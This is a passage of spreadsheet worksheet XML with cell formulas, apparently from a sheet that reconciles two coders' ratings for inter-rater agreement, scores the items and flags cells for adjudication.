        <f>IF(AND(Coder1!AE167&amp;""&lt;&gt;"",Coder1!AE167&amp;""=Coder2!AE167&amp;""),Coder1!AE167,"")</f>
        <v/>
      </c>
      <c r="AF167" s="14">
        <f>IF(AND(Coder1!AF167&amp;""&lt;&gt;"",Coder1!AF167&amp;""=Coder2!AF167&amp;""),Coder1!AF167,"")</f>
        <v/>
      </c>
      <c r="AG167" s="14">
        <f>IF(AND(Coder1!AG167&amp;""&lt;&gt;"",Coder1!AG167&amp;""=Coder2!AG167&amp;""),Coder1!AG167,"")</f>
        <v/>
      </c>
      <c r="AH167" s="14">
        <f>IF(AND(Coder1!AH167&amp;""&lt;&gt;"",Coder1!AH167&amp;""=Coder2!AH167&amp;""),Coder1!AH167,"")</f>
        <v/>
      </c>
      <c r="AI167" s="11">
        <f>IF(COUNT(E167:L167)=0,"",SUM(E167:L167))</f>
        <v/>
      </c>
      <c r="AJ167" s="11">
        <f>IF(AI167="","",N(E167)*3+N(F167)*2+N(G167)*2+N(H167)*2+N(I167)*2+N(J167)*3+N(K167)*3+N(L167)*3)</f>
        <v/>
      </c>
      <c r="AK167" s="11">
        <f>IF(AI167="","",COUNTIF(N167:AG167,1))</f>
        <v/>
      </c>
      <c r="AL167" s="11">
        <f>IF(OR(AJ167="",AJ167=0),"",ROUND(100*(AJ167-AK167)/AJ167,1))</f>
        <v/>
      </c>
      <c r="AM167" s="11">
        <f>IF(AND(Coder1!AN167=1,Coder2!AN167=1),IF(COUNTBLANK(E167:AH167)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN167" s="11">
        <f>IF(AND(Coder1!AN167=1,Coder2!AN167=1),IF(SUMPRODUCT(--(Coder1!E167:AH167&amp;""&lt;&gt;Coder2!E167:AH167&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO167" s="11" t="n"/>
    </row>
    <row r="168">
      <c r="A168" s="11">
        <f>Coder1!A168</f>
        <v/>
      </c>
      <c r="B168" s="11">
        <f>Coder1!B168</f>
        <v/>
      </c>
      <c r="C168" s="11">
        <f>Coder1!C168</f>
        <v/>
      </c>
      <c r="D168" s="11">
        <f>Coder1!D168</f>
        <v/>
      </c>
      <c r="E168" s="14">
        <f>IF(AND(Coder1!E168&amp;""&lt;&gt;"",Coder1!E168&amp;""=Coder2!E168&amp;""),Coder1!E168,"")</f>
        <v/>
      </c>
      <c r="F168" s="14">
        <f>IF(AND(Coder1!F168&amp;""&lt;&gt;"",Coder1!F168&amp;""=Coder2!F168&amp;""),Coder1!F168,"")</f>
        <v/>
      </c>
      <c r="G168" s="14">
        <f>IF(AND(Coder1!G168&amp;""&lt;&gt;"",Coder1!G168&amp;""=Coder2!G168&amp;""),Coder1!G168,"")</f>
        <v/>
      </c>
      <c r="H168" s="14">
        <f>IF(AND(Coder1!H168&amp;""&lt;&gt;"",Coder1!H168&amp;""=Coder2!H168&amp;""),Coder1!H168,"")</f>
        <v/>
      </c>
      <c r="I168" s="14">
        <f>IF(AND(Coder1!I168&amp;""&lt;&gt;"",Coder1!I168&amp;""=Coder2!I168&amp;""),Coder1!I168,"")</f>
        <v/>
      </c>
      <c r="J168" s="14">
        <f>IF(AND(Coder1!J168&amp;""&lt;&gt;"",Coder1!J168&amp;""=Coder2!J168&amp;""),Coder1!J168,"")</f>
        <v/>
      </c>
      <c r="K168" s="14">
        <f>IF(AND(Coder1!K168&amp;""&lt;&gt;"",Coder1!K168&amp;""=Coder2!K168&amp;""),Coder1!K168,"")</f>
        <v/>
      </c>
      <c r="L168" s="14">
        <f>IF(AND(Coder1!L168&amp;""&lt;&gt;"",Coder1!L168&amp;""=Coder2!L168&amp;""),Coder1!L168,"")</f>
        <v/>
      </c>
      <c r="M168" s="14">
        <f>IF(AND(Coder1!M168&amp;""&lt;&gt;"",Coder1!M168&amp;""=Coder2!M168&amp;""),Coder1!M168,"")</f>
        <v/>
      </c>
      <c r="N168" s="14">
        <f>IF(AND(Coder1!N168&amp;""&lt;&gt;"",Coder1!N168&amp;""=Coder2!N168&amp;""),Coder1!N168,"")</f>
        <v/>
      </c>
      <c r="O168" s="14">
        <f>IF(AND(Coder1!O168&amp;""&lt;&gt;"",Coder1!O168&amp;""=Coder2!O168&amp;""),Coder1!O168,"")</f>
        <v/>
      </c>
      <c r="P168" s="14">
        <f>IF(AND(Coder1!P168&amp;""&lt;&gt;"",Coder1!P168&amp;""=Coder2!P168&amp;""),Coder1!P168,"")</f>
        <v/>
      </c>
      <c r="Q168" s="14">
        <f>IF(AND(Coder1!Q168&amp;""&lt;&gt;"",Coder1!Q168&amp;""=Coder2!Q168&amp;""),Coder1!Q168,"")</f>
        <v/>
      </c>
      <c r="R168" s="14">
        <f>IF(AND(Coder1!R168&amp;""&lt;&gt;"",Coder1!R168&amp;""=Coder2!R168&amp;""),Coder1!R168,"")</f>
        <v/>
      </c>
      <c r="S168" s="14">
        <f>IF(AND(Coder1!S168&amp;""&lt;&gt;"",Coder1!S168&amp;""=Coder2!S168&amp;""),Coder1!S168,"")</f>
        <v/>
      </c>
      <c r="T168" s="14">
        <f>IF(AND(Coder1!T168&amp;""&lt;&gt;"",Coder1!T168&amp;""=Coder2!T168&amp;""),Coder1!T168,"")</f>
        <v/>
      </c>
      <c r="U168" s="14">
        <f>IF(AND(Coder1!U168&amp;""&lt;&gt;"",Coder1!U168&amp;""=Coder2!U168&amp;""),Coder1!U168,"")</f>
        <v/>
      </c>
      <c r="V168" s="14">
        <f>IF(AND(Coder1!V168&amp;""&lt;&gt;"",Coder1!V168&amp;""=Coder2!V168&amp;""),Coder1!V168,"")</f>
        <v/>
      </c>
      <c r="W168" s="14">
        <f>IF(AND(Coder1!W168&amp;""&lt;&gt;"",Coder1!W168&amp;""=Coder2!W168&amp;""),Coder1!W168,"")</f>
        <v/>
      </c>
      <c r="X168" s="14">
        <f>IF(AND(Coder1!X168&amp;""&lt;&gt;"",Coder1!X168&amp;""=Coder2!X168&amp;""),Coder1!X168,"")</f>
        <v/>
      </c>
      <c r="Y168" s="14">
        <f>IF(AND(Coder1!Y168&amp;""&lt;&gt;"",Coder1!Y168&amp;""=Coder2!Y168&amp;""),Coder1!Y168,"")</f>
        <v/>
      </c>
      <c r="Z168" s="14">
        <f>IF(AND(Coder1!Z168&amp;""&lt;&gt;"",Coder1!Z168&amp;""=Coder2!Z168&amp;""),Coder1!Z168,"")</f>
        <v/>
      </c>
      <c r="AA168" s="14">
        <f>IF(AND(Coder1!AA168&amp;""&lt;&gt;"",Coder1!AA168&amp;""=Coder2!AA168&amp;""),Coder1!AA168,"")</f>
        <v/>
      </c>
      <c r="AB168" s="14">
        <f>IF(AND(Coder1!AB168&amp;""&lt;&gt;"",Coder1!AB168&amp;""=Coder2!AB168&amp;""),Coder1!AB168,"")</f>
        <v/>
      </c>
      <c r="AC168" s="14">
        <f>IF(AND(Coder1!AC168&amp;""&lt;&gt;"",Coder1!AC168&amp;""=Coder2!AC168&amp;""),Coder1!AC168,"")</f>
        <v/>
      </c>
      <c r="AD168" s="14">
        <f>IF(AND(Coder1!AD168&amp;""&lt;&gt;"",Coder1!AD168&amp;""=Coder2!AD168&amp;""),Coder1!AD168,"")</f>
        <v/>
      </c>
      <c r="AE168" s="14">
        <f>IF(AND(Coder1!AE168&amp;""&lt;&gt;"",Coder1!AE168&amp;""=Coder2!AE168&amp;""),Coder1!AE168,"")</f>
        <v/>
      </c>
      <c r="AF168" s="14">
        <f>IF(AND(Coder1!AF168&amp;""&lt;&gt;"",Coder1!AF168&amp;""=Coder2!AF168&amp;""),Coder1!AF168,"")</f>
        <v/>
      </c>
      <c r="AG168" s="14">
        <f>IF(AND(Coder1!AG168&amp;""&lt;&gt;"",Coder1!AG168&amp;""=Coder2!AG168&amp;""),Coder1!AG168,"")</f>
        <v/>
      </c>
      <c r="AH168" s="14">
        <f>IF(AND(Coder1!AH168&amp;""&lt;&gt;"",Coder1!AH168&amp;""=Coder2!AH168&amp;""),Coder1!AH168,"")</f>
        <v/>
      </c>
      <c r="AI168" s="11">
        <f>IF(COUNT(E168:L168)=0,"",SUM(E168:L168))</f>
        <v/>
      </c>
      <c r="AJ168" s="11">
        <f>IF(AI168="","",N(E168)*3+N(F168)*2+N(G168)*2+N(H168)*2+N(I168)*2+N(J168)*3+N(K168)*3+N(L168)*3)</f>
        <v/>
      </c>
      <c r="AK168" s="11">
        <f>IF(AI168="","",COUNTIF(N168:AG168,1))</f>
        <v/>
      </c>
      <c r="AL168" s="11">
        <f>IF(OR(AJ168="",AJ168=0),"",ROUND(100*(AJ168-AK168)/AJ168,1))</f>
        <v/>
      </c>
      <c r="AM168" s="11">
        <f>IF(AND(Coder1!AN168=1,Coder2!AN168=1),IF(COUNTBLANK(E168:AH168)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN168" s="11">
        <f>IF(AND(Coder1!AN168=1,Coder2!AN168=1),IF(SUMPRODUCT(--(Coder1!E168:AH168&amp;""&lt;&gt;Coder2!E168:AH168&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO168" s="11" t="n"/>
    </row>
    <row r="169">
      <c r="A169" s="11">
        <f>Coder1!A169</f>
        <v/>
      </c>
      <c r="B169" s="11">
        <f>Coder1!B169</f>
        <v/>
      </c>
      <c r="C169" s="11">
        <f>Coder1!C169</f>
        <v/>
      </c>
      <c r="D169" s="11">
        <f>Coder1!D169</f>
        <v/>
      </c>
      <c r="E169" s="14">
        <f>IF(AND(Coder1!E169&amp;""&lt;&gt;"",Coder1!E169&amp;""=Coder2!E169&amp;""),Coder1!E169,"")</f>
        <v/>
      </c>
      <c r="F169" s="14">
        <f>IF(AND(Coder1!F169&amp;""&lt;&gt;"",Coder1!F169&amp;""=Coder2!F169&amp;""),Coder1!F169,"")</f>
        <v/>
      </c>
      <c r="G169" s="14">
        <f>IF(AND(Coder1!G169&amp;""&lt;&gt;"",Coder1!G169&amp;""=Coder2!G169&amp;""),Coder1!G169,"")</f>
        <v/>
      </c>
      <c r="H169" s="14">
        <f>IF(AND(Coder1!H169&amp;""&lt;&gt;"",Coder1!H169&amp;""=Coder2!H169&amp;""),Coder1!H169,"")</f>
        <v/>
      </c>
      <c r="I169" s="14">
        <f>IF(AND(Coder1!I169&amp;""&lt;&gt;"",Coder1!I169&amp;""=Coder2!I169&amp;""),Coder1!I169,"")</f>
        <v/>
      </c>
      <c r="J169" s="14">
        <f>IF(AND(Coder1!J169&amp;""&lt;&gt;"",Coder1!J169&amp;""=Coder2!J169&amp;""),Coder1!J169,"")</f>
        <v/>
      </c>
      <c r="K169" s="14">
        <f>IF(AND(Coder1!K169&amp;""&lt;&gt;"",Coder1!K169&amp;""=Coder2!K169&amp;""),Coder1!K169,"")</f>
        <v/>
      </c>
      <c r="L169" s="14">
        <f>IF(AND(Coder1!L169&amp;""&lt;&gt;"",Coder1!L169&amp;""=Coder2!L169&amp;""),Coder1!L169,"")</f>
        <v/>
      </c>
      <c r="M169" s="14">
        <f>IF(AND(Coder1!M169&amp;""&lt;&gt;"",Coder1!M169&amp;""=Coder2!M169&amp;""),Coder1!M169,"")</f>
        <v/>
      </c>
      <c r="N169" s="14">
        <f>IF(AND(Coder1!N169&amp;""&lt;&gt;"",Coder1!N169&amp;""=Coder2!N169&amp;""),Coder1!N169,"")</f>
        <v/>
      </c>
      <c r="O169" s="14">
        <f>IF(AND(Coder1!O169&amp;""&lt;&gt;"",Coder1!O169&amp;""=Coder2!O169&amp;""),Coder1!O169,"")</f>
        <v/>
      </c>
      <c r="P169" s="14">
        <f>IF(AND(Coder1!P169&amp;""&lt;&gt;"",Coder1!P169&amp;""=Coder2!P169&amp;""),Coder1!P169,"")</f>
        <v/>
      </c>
      <c r="Q169" s="14">
        <f>IF(AND(Coder1!Q169&amp;""&lt;&gt;"",Coder1!Q169&amp;""=Coder2!Q169&amp;""),Coder1!Q169,"")</f>
        <v/>
      </c>
      <c r="R169" s="14">
        <f>IF(AND(Coder1!R169&amp;""&lt;&gt;"",Coder1!R169&amp;""=Coder2!R169&amp;""),Coder1!R169,"")</f>
        <v/>
      </c>
      <c r="S169" s="14">
        <f>IF(AND(Coder1!S169&amp;""&lt;&gt;"",Coder1!S169&amp;""=Coder2!S169&amp;""),Coder1!S169,"")</f>
        <v/>
      </c>
      <c r="T169" s="14">
        <f>IF(AND(Coder1!T169&amp;""&lt;&gt;"",Coder1!T169&amp;""=Coder2!T169&amp;""),Coder1!T169,"")</f>
        <v/>
      </c>
      <c r="U169" s="14">
        <f>IF(AND(Coder1!U169&amp;""&lt;&gt;"",Coder1!U169&amp;""=Coder2!U169&amp;""),Coder1!U169,"")</f>
        <v/>
      </c>
      <c r="V169" s="14">
        <f>IF(AND(Coder1!V169&amp;""&lt;&gt;"",Coder1!V169&amp;""=Coder2!V169&amp;""),Coder1!V169,"")</f>
        <v/>
      </c>
      <c r="W169" s="14">
        <f>IF(AND(Coder1!W169&amp;""&lt;&gt;"",Coder1!W169&amp;""=Coder2!W169&amp;""),Coder1!W169,"")</f>
        <v/>
      </c>
      <c r="X169" s="14">
        <f>IF(AND(Coder1!X169&amp;""&lt;&gt;"",Coder1!X169&amp;""=Coder2!X169&amp;""),Coder1!X169,"")</f>
        <v/>
      </c>
      <c r="Y169" s="14">
        <f>IF(AND(Coder1!Y169&amp;""&lt;&gt;"",Coder1!Y169&amp;""=Coder2!Y169&amp;""),Coder1!Y169,"")</f>
        <v/>
      </c>
      <c r="Z169" s="14">
        <f>IF(AND(Coder1!Z169&amp;""&lt;&gt;"",Coder1!Z169&amp;""=Coder2!Z169&amp;""),Coder1!Z169,"")</f>
        <v/>
      </c>
      <c r="AA169" s="14">
        <f>IF(AND(Coder1!AA169&amp;""&lt;&gt;"",Coder1!AA169&amp;""=Coder2!AA169&amp;""),Coder1!AA169,"")</f>
        <v/>
      </c>
      <c r="AB169" s="14">
        <f>IF(AND(Coder1!AB169&amp;""&lt;&gt;"",Coder1!AB169&amp;""=Coder2!AB169&amp;""),Coder1!AB169,"")</f>
        <v/>
      </c>
      <c r="AC169" s="14">
        <f>IF(AND(Coder1!AC169&amp;""&lt;&gt;"",Coder1!AC169&amp;""=Coder2!AC169&amp;""),Coder1!AC169,"")</f>
        <v/>
      </c>
      <c r="AD169" s="14">
        <f>IF(AND(Coder1!AD169&amp;""&lt;&gt;"",Coder1!AD169&amp;""=Coder2!AD169&amp;""),Coder1!AD169,"")</f>
        <v/>
      </c>
      <c r="AE169" s="14">
        <f>IF(AND(Coder1!AE169&amp;""&lt;&gt;"",Coder1!AE169&amp;""=Coder2!AE169&amp;""),Coder1!AE169,"")</f>
        <v/>
      </c>
      <c r="AF169" s="14">
        <f>IF(AND(Coder1!AF169&amp;""&lt;&gt;"",Coder1!AF169&amp;""=Coder2!AF169&amp;""),Coder1!AF169,"")</f>
        <v/>
      </c>
      <c r="AG169" s="14">
        <f>IF(AND(Coder1!AG169&amp;""&lt;&gt;"",Coder1!AG169&amp;""=Coder2!AG169&amp;""),Coder1!AG169,"")</f>
        <v/>
      </c>
      <c r="AH169" s="14">
        <f>IF(AND(Coder1!AH169&amp;""&lt;&gt;"",Coder1!AH169&amp;""=Coder2!AH169&amp;""),Coder1!AH169,"")</f>
        <v/>
      </c>
      <c r="AI169" s="11">
        <f>IF(COUNT(E169:L169)=0,"",SUM(E169:L169))</f>
        <v/>
      </c>
      <c r="AJ169" s="11">
        <f>IF(AI169="","",N(E169)*3+N(F169)*2+N(G169)*2+N(H169)*2+N(I169)*2+N(J169)*3+N(K169)*3+N(L169)*3)</f>
        <v/>
      </c>
      <c r="AK169" s="11">
        <f>IF(AI169="","",COUNTIF(N169:AG169,1))</f>
        <v/>
      </c>
      <c r="AL169" s="11">
        <f>IF(OR(AJ169="",AJ169=0),"",ROUND(100*(AJ169-AK169)/AJ169,1))</f>
        <v/>
      </c>
      <c r="AM169" s="11">
        <f>IF(AND(Coder1!AN169=1,Coder2!AN169=1),IF(COUNTBLANK(E169:AH169)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN169" s="11">
        <f>IF(AND(Coder1!AN169=1,Coder2!AN169=1),IF(SUMPRODUCT(--(Coder1!E169:AH169&amp;""&lt;&gt;Coder2!E169:AH169&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO169" s="11" t="n"/>
    </row>
    <row r="170">
      <c r="A170" s="11">
        <f>Coder1!A170</f>
        <v/>
      </c>
      <c r="B170" s="11">
        <f>Coder1!B170</f>
        <v/>
      </c>
      <c r="C170" s="11">
        <f>Coder1!C170</f>
        <v/>
      </c>
      <c r="D170" s="11">
        <f>Coder1!D170</f>
        <v/>
      </c>
      <c r="E170" s="14">
        <f>IF(AND(Coder1!E170&amp;""&lt;&gt;"",Coder1!E170&amp;""=Coder2!E170&amp;""),Coder1!E170,"")</f>
        <v/>
      </c>
      <c r="F170" s="14">
        <f>IF(AND(Coder1!F170&amp;""&lt;&gt;"",Coder1!F170&amp;""=Coder2!F170&amp;""),Coder1!F170,"")</f>
        <v/>
      </c>
      <c r="G170" s="14">
        <f>IF(AND(Coder1!G170&amp;""&lt;&gt;"",Coder1!G170&amp;""=Coder2!G170&amp;""),Coder1!G170,"")</f>
        <v/>
      </c>
      <c r="H170" s="14">
        <f>IF(AND(Coder1!H170&amp;""&lt;&gt;"",Coder1!H170&amp;""=Coder2!H170&amp;""),Coder1!H170,"")</f>
        <v/>
      </c>
      <c r="I170" s="14">
        <f>IF(AND(Coder1!I170&amp;""&lt;&gt;"",Coder1!I170&amp;""=Coder2!I170&amp;""),Coder1!I170,"")</f>
        <v/>
      </c>
      <c r="J170" s="14">
        <f>IF(AND(Coder1!J170&amp;""&lt;&gt;"",Coder1!J170&amp;""=Coder2!J170&amp;""),Coder1!J170,"")</f>
        <v/>
      </c>
      <c r="K170" s="14">
        <f>IF(AND(Coder1!K170&amp;""&lt;&gt;"",Coder1!K170&amp;""=Coder2!K170&amp;""),Coder1!K170,"")</f>
        <v/>
      </c>
      <c r="L170" s="14">
        <f>IF(AND(Coder1!L170&amp;""&lt;&gt;"",Coder1!L170&amp;""=Coder2!L170&amp;""),Coder1!L170,"")</f>
        <v/>
      </c>
      <c r="M170" s="14">
        <f>IF(AND(Coder1!M170&amp;""&lt;&gt;"",Coder1!M170&amp;""=Coder2!M170&amp;""),Coder1!M170,"")</f>
        <v/>
      </c>
      <c r="N170" s="14">
        <f>IF(AND(Coder1!N170&amp;""&lt;&gt;"",Coder1!N170&amp;""=Coder2!N170&amp;""),Coder1!N170,"")</f>
        <v/>
      </c>
      <c r="O170" s="14">
        <f>IF(AND(Coder1!O170&amp;""&lt;&gt;"",Coder1!O170&amp;""=Coder2!O170&amp;""),Coder1!O170,"")</f>
        <v/>
      </c>
      <c r="P170" s="14">
        <f>IF(AND(Coder1!P170&amp;""&lt;&gt;"",Coder1!P170&amp;""=Coder2!P170&amp;""),Coder1!P170,"")</f>
        <v/>
      </c>
      <c r="Q170" s="14">
        <f>IF(AND(Coder1!Q170&amp;""&lt;&gt;"",Coder1!Q170&amp;""=Coder2!Q170&amp;""),Coder1!Q170,"")</f>
        <v/>
      </c>
      <c r="R170" s="14">
        <f>IF(AND(Coder1!R170&amp;""&lt;&gt;"",Coder1!R170&amp;""=Coder2!R170&amp;""),Coder1!R170,"")</f>
        <v/>
      </c>
      <c r="S170" s="14">
        <f>IF(AND(Coder1!S170&amp;""&lt;&gt;"",Coder1!S170&amp;""=Coder2!S170&amp;""),Coder1!S170,"")</f>
        <v/>
      </c>
      <c r="T170" s="14">
        <f>IF(AND(Coder1!T170&amp;""&lt;&gt;"",Coder1!T170&amp;""=Coder2!T170&amp;""),Coder1!T170,"")</f>
        <v/>
      </c>
      <c r="U170" s="14">
        <f>IF(AND(Coder1!U170&amp;""&lt;&gt;"",Coder1!U170&amp;""=Coder2!U170&amp;""),Coder1!U170,"")</f>
        <v/>
      </c>
      <c r="V170" s="14">
        <f>IF(AND(Coder1!V170&amp;""&lt;&gt;"",Coder1!V170&amp;""=Coder2!V170&amp;""),Coder1!V170,"")</f>
        <v/>
      </c>
      <c r="W170" s="14">
        <f>IF(AND(Coder1!W170&amp;""&lt;&gt;"",Coder1!W170&amp;""=Coder2!W170&amp;""),Coder1!W170,"")</f>
        <v/>
      </c>
      <c r="X170" s="14">
        <f>IF(AND(Coder1!X170&amp;""&lt;&gt;"",Coder1!X170&amp;""=Coder2!X170&amp;""),Coder1!X170,"")</f>
        <v/>
      </c>
      <c r="Y170" s="14">
        <f>IF(AND(Coder1!Y170&amp;""&lt;&gt;"",Coder1!Y170&amp;""=Coder2!Y170&amp;""),Coder1!Y170,"")</f>
        <v/>
      </c>
      <c r="Z170" s="14">
        <f>IF(AND(Coder1!Z170&amp;""&lt;&gt;"",Coder1!Z170&amp;""=Coder2!Z170&amp;""),Coder1!Z170,"")</f>
        <v/>
      </c>
      <c r="AA170" s="14">
        <f>IF(AND(Coder1!AA170&amp;""&lt;&gt;"",Coder1!AA170&amp;""=Coder2!AA170&amp;""),Coder1!AA170,"")</f>
        <v/>
      </c>
      <c r="AB170" s="14">
        <f>IF(AND(Coder1!AB170&amp;""&lt;&gt;"",Coder1!AB170&amp;""=Coder2!AB170&amp;""),Coder1!AB170,"")</f>
        <v/>
      </c>
      <c r="AC170" s="14">
        <f>IF(AND(Coder1!AC170&amp;""&lt;&gt;"",Coder1!AC170&amp;""=Coder2!AC170&amp;""),Coder1!AC170,"")</f>
        <v/>
      </c>
      <c r="AD170" s="14">
        <f>IF(AND(Coder1!AD170&amp;""&lt;&gt;"",Coder1!AD170&amp;""=Coder2!AD170&amp;""),Coder1!AD170,"")</f>
        <v/>
      </c>
      <c r="AE170" s="14">
        <f>IF(AND(Coder1!AE170&amp;""&lt;&gt;"",Coder1!AE170&amp;""=Coder2!AE170&amp;""),Coder1!AE170,"")</f>
        <v/>
      </c>
      <c r="AF170" s="14">
        <f>IF(AND(Coder1!AF170&amp;""&lt;&gt;"",Coder1!AF170&amp;""=Coder2!AF170&amp;""),Coder1!AF170,"")</f>
        <v/>
      </c>
      <c r="AG170" s="14">
        <f>IF(AND(Coder1!AG170&amp;""&lt;&gt;"",Coder1!AG170&amp;""=Coder2!AG170&amp;""),Coder1!AG170,"")</f>
        <v/>
      </c>
      <c r="AH170" s="14">
        <f>IF(AND(Coder1!AH170&amp;""&lt;&gt;"",Coder1!AH170&amp;""=Coder2!AH170&amp;""),Coder1!AH170,"")</f>
        <v/>
      </c>
      <c r="AI170" s="11">
        <f>IF(COUNT(E170:L170)=0,"",SUM(E170:L170))</f>
        <v/>
      </c>
      <c r="AJ170" s="11">
        <f>IF(AI170="","",N(E170)*3+N(F170)*2+N(G170)*2+N(H170)*2+N(I170)*2+N(J170)*3+N(K170)*3+N(L170)*3)</f>
        <v/>
      </c>
      <c r="AK170" s="11">
        <f>IF(AI170="","",COUNTIF(N170:AG170,1))</f>
        <v/>
      </c>
      <c r="AL170" s="11">
        <f>IF(OR(AJ170="",AJ170=0),"",ROUND(100*(AJ170-AK170)/AJ170,1))</f>
        <v/>
      </c>
      <c r="AM170" s="11">
        <f>IF(AND(Coder1!AN170=1,Coder2!AN170=1),IF(COUNTBLANK(E170:AH170)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN170" s="11">
        <f>IF(AND(Coder1!AN170=1,Coder2!AN170=1),IF(SUMPRODUCT(--(Coder1!E170:AH170&amp;""&lt;&gt;Coder2!E170:AH170&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO170" s="11" t="n"/>
    </row>
    <row r="171">
      <c r="A171" s="11">
        <f>Coder1!A171</f>
        <v/>
      </c>
      <c r="B171" s="11">
        <f>Coder1!B171</f>
        <v/>
      </c>
      <c r="C171" s="11">
        <f>Coder1!C171</f>
        <v/>
      </c>
      <c r="D171" s="11">
        <f>Coder1!D171</f>
        <v/>
      </c>
      <c r="E171" s="14">
        <f>IF(AND(Coder1!E171&amp;""&lt;&gt;"",Coder1!E171&amp;""=Coder2!E171&amp;""),Coder1!E171,"")</f>
        <v/>
      </c>
      <c r="F171" s="14">
        <f>IF(AND(Coder1!F171&amp;""&lt;&gt;"",Coder1!F171&amp;""=Coder2!F171&amp;""),Coder1!F171,"")</f>
        <v/>
      </c>
      <c r="G171" s="14">
        <f>IF(AND(Coder1!G171&amp;""&lt;&gt;"",Coder1!G171&amp;""=Coder2!G171&amp;""),Coder1!G171,"")</f>
        <v/>
      </c>
      <c r="H171" s="14">
        <f>IF(AND(Coder1!H171&amp;""&lt;&gt;"",Coder1!H171&amp;""=Coder2!H171&amp;""),Coder1!H171,"")</f>
        <v/>
      </c>
      <c r="I171" s="14">
        <f>IF(AND(Coder1!I171&amp;""&lt;&gt;"",Coder1!I171&amp;""=Coder2!I171&amp;""),Coder1!I171,"")</f>
        <v/>
      </c>
      <c r="J171" s="14">
        <f>IF(AND(Coder1!J171&amp;""&lt;&gt;"",Coder1!J171&amp;""=Coder2!J171&amp;""),Coder1!J171,"")</f>
        <v/>
      </c>
      <c r="K171" s="14">
        <f>IF(AND(Coder1!K171&amp;""&lt;&gt;"",Coder1!K171&amp;""=Coder2!K171&amp;""),Coder1!K171,"")</f>
        <v/>
      </c>
      <c r="L171" s="14">
        <f>IF(AND(Coder1!L171&amp;""&lt;&gt;"",Coder1!L171&amp;""=Coder2!L171&amp;""),Coder1!L171,"")</f>
        <v/>
      </c>
      <c r="M171" s="14">
        <f>IF(AND(Coder1!M171&amp;""&lt;&gt;"",Coder1!M171&amp;""=Coder2!M171&amp;""),Coder1!M171,"")</f>
        <v/>
      </c>
      <c r="N171" s="14">
        <f>IF(AND(Coder1!N171&amp;""&lt;&gt;"",Coder1!N171&amp;""=Coder2!N171&amp;""),Coder1!N171,"")</f>
        <v/>
      </c>
      <c r="O171" s="14">
        <f>IF(AND(Coder1!O171&amp;""&lt;&gt;"",Coder1!O171&amp;""=Coder2!O171&amp;""),Coder1!O171,"")</f>
        <v/>
      </c>
      <c r="P171" s="14">
        <f>IF(AND(Coder1!P171&amp;""&lt;&gt;"",Coder1!P171&amp;""=Coder2!P171&amp;""),Coder1!P171,"")</f>
        <v/>
      </c>
      <c r="Q171" s="14">
        <f>IF(AND(Coder1!Q171&amp;""&lt;&gt;"",Coder1!Q171&amp;""=Coder2!Q171&amp;""),Coder1!Q171,"")</f>
        <v/>
      </c>
      <c r="R171" s="14">
        <f>IF(AND(Coder1!R171&amp;""&lt;&gt;"",Coder1!R171&amp;""=Coder2!R171&amp;""),Coder1!R171,"")</f>
        <v/>
      </c>
      <c r="S171" s="14">
        <f>IF(AND(Coder1!S171&amp;""&lt;&gt;"",Coder1!S171&amp;""=Coder2!S171&amp;""),Coder1!S171,"")</f>
        <v/>
      </c>
      <c r="T171" s="14">
        <f>IF(AND(Coder1!T171&amp;""&lt;&gt;"",Coder1!T171&amp;""=Coder2!T171&amp;""),Coder1!T171,"")</f>
        <v/>
      </c>
      <c r="U171" s="14">
        <f>IF(AND(Coder1!U171&amp;""&lt;&gt;"",Coder1!U171&amp;""=Coder2!U171&amp;""),Coder1!U171,"")</f>
        <v/>
      </c>
      <c r="V171" s="14">
        <f>IF(AND(Coder1!V171&amp;""&lt;&gt;"",Coder1!V171&amp;""=Coder2!V171&amp;""),Coder1!V171,"")</f>
        <v/>
      </c>
      <c r="W171" s="14">
        <f>IF(AND(Coder1!W171&amp;""&lt;&gt;"",Coder1!W171&amp;""=Coder2!W171&amp;""),Coder1!W171,"")</f>
        <v/>
      </c>
      <c r="X171" s="14">
        <f>IF(AND(Coder1!X171&amp;""&lt;&gt;"",Coder1!X171&amp;""=Coder2!X171&amp;""),Coder1!X171,"")</f>
        <v/>
      </c>
      <c r="Y171" s="14">
        <f>IF(AND(Coder1!Y171&amp;""&lt;&gt;"",Coder1!Y171&amp;""=Coder2!Y171&amp;""),Coder1!Y171,"")</f>
        <v/>
      </c>
      <c r="Z171" s="14">
        <f>IF(AND(Coder1!Z171&amp;""&lt;&gt;"",Coder1!Z171&amp;""=Coder2!Z171&amp;""),Coder1!Z171,"")</f>
        <v/>
      </c>
      <c r="AA171" s="14">
        <f>IF(AND(Coder1!AA171&amp;""&lt;&gt;"",Coder1!AA171&amp;""=Coder2!AA171&amp;""),Coder1!AA171,"")</f>
        <v/>
      </c>
      <c r="AB171" s="14">
        <f>IF(AND(Coder1!AB171&amp;""&lt;&gt;"",Coder1!AB171&amp;""=Coder2!AB171&amp;""),Coder1!AB171,"")</f>
        <v/>
      </c>
      <c r="AC171" s="14">
        <f>IF(AND(Coder1!AC171&amp;""&lt;&gt;"",Coder1!AC171&amp;""=Coder2!AC171&amp;""),Coder1!AC171,"")</f>
        <v/>
      </c>
      <c r="AD171" s="14">
        <f>IF(AND(Coder1!AD171&amp;""&lt;&gt;"",Coder1!AD171&amp;""=Coder2!AD171&amp;""),Coder1!AD171,"")</f>
        <v/>
      </c>
      <c r="AE171" s="14">
        <f>IF(AND(Coder1!AE171&amp;""&lt;&gt;"",Coder1!AE171&amp;""=Coder2!AE171&amp;""),Coder1!AE171,"")</f>
        <v/>
      </c>
      <c r="AF171" s="14">
        <f>IF(AND(Coder1!AF171&amp;""&lt;&gt;"",Coder1!AF171&amp;""=Coder2!AF171&amp;""),Coder1!AF171,"")</f>
        <v/>
      </c>
      <c r="AG171" s="14">
        <f>IF(AND(Coder1!AG171&amp;""&lt;&gt;"",Coder1!AG171&amp;""=Coder2!AG171&amp;""),Coder1!AG171,"")</f>
        <v/>
      </c>
      <c r="AH171" s="14">
